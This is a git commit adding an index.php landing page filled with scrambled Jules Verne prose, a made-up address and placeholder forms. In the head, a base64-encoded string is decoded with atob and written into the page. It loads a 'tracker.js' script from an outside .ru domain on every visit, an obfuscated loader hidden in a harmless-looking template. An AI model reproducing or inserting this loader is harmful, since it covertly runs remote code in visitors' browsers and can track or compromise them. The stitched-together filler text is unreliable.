d20ceed5edf934c57399d3cffb5555fa22ebb85a
gqkkkyap <77445934+gqkkkyap@users.noreply.github.com>
2021-01-14 15:30:20 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>In my own, sir!</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9meDNkeDIzbGh1MW1ucnR1dGsiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="cp3oc90onveif9yx1rn">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="#">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="9ggpji0kuon9ax16qo0o">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>In my own, sir!</h1>
+	</section>
+
+
+	<section class="our-work" class="r4n71s99ns5dn6x28">
+		<h3 class="title">In the midst of these living plants, and under the </h3>
+		<p>With my companions? I asked. I must not hesitate, even if Captain Nemo himself should rise before me. I opened my door carefully; and even then, as it turned on its hinges, it seemed to me to make a dreadful noise. Perhaps it only existed in my own imagination. The boat flew over the waves. Some minutes after we met the shark's dead body floating. By the black marking of the extremity of its fins, I recognized the terrible melanopteron of the Indian seas, of the species of shark properly so called. It was more than twenty-five feet long; its enormous mouth occupied one-third of its body. It was an adult, as was known by its six rows of teeth placed in an isosceles triangle in the upper jaw. Well, Master Land? said he.</p>
+		<hr>
+
+		<ul class="grid" class="z5z676dan6t8z5vnqpqen">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="cp3oc90onveif9yx1rn">
+		<h3 class="title">Very nearly-they are savages.</h3>
+		<p>Upon that I was going away; but Captain Nemo detained me, and asked me to sit down by him. He questioned me with interest about our excursions on shore, and our hunting, and seemed not to understand the craving for meat that possessed the Canadian. Then the conversation turned on various subjects, and without being more communicative, Captain Nemo showed himself more amiable. An iceberg! said the Canadian to me. It leads to the small boat, he said. November 11th, early in the morning. The fresh air spreading over the interior of the Nautilus told me that we had come to the surface of the ocean to renew our supply of oxygen. I directed my steps to the central staircase, and mounted the platform.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="9ggpji0kuon9ax16qo0o" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="z5z676dan6t8z5vnqpqen" class="title">Is he ill?</h3>	
+		<p>Then I did the same for Conseil, and we continued to swim near to each other. We pursued it without relaxation for an hour, and I began to think it would prove difficult to capture, when the animal, possessed with the perverse idea of vengeance, of which he had cause to repent, turned upon the pinnace and assailed us in its turn. Everyone to his own, answered the captain, looking fixedly at Ned Land. Unfortunately, he continued, I cannot take you through the Suez Canal; but you will be able to see the long jetty of Port Said after to-morrow, when we shall be in the Mediterranean.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="cp3oc90onveif9yx1rn">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="9ggpji0kuon9ax16qo0o"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="r4n71s99ns5dn6x28"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="z5z676dan6t8z5vnqpqen"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>744 Stroman Stream, Apt. 740, 89234-0785, Schuliststad, Alabama, United States</p>
+	</footer>
+
+</body>
+
+</html>
